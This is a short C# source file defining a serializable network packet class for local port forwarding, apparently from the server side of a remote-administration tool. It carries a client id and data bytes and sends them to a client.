using System;
using xServer.Core.Networking;
using xServer.Core.Packets;

namespace xServer.Core.PortForward.Local.Packets
{
    [Serializable]
    public class LocalPortForwardData : IPacket
    {
        public int ClientId { get; set; }

        public byte[] Data { get; set; }

        public LocalPortForwardData()
        {
        }

        public LocalPortForwardData(int id, byte[] data)
        {
            this.ClientId = id;
            this.Data = data;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}